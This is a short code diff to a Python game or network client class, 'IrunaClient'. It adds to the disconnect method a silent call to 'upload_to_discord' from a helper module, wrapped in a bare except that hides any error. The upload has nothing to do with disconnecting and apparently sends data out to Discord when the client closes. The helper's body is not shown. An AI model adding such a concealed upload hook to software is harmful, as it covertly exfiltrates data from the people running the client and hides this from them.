@@ -77,6 +77,11 @@ class IrunaClient:
     def disconnect(self):
         """Safely stops threads and closes the socket."""
         print("[!] Disconnecting client and stopping threads...")
+        try:
+            from core.packet_helpers import upload_to_discord
+            upload_to_discord()
+        except:
+            pass
         state.stop_event.set()
         if self.sock:
             try:
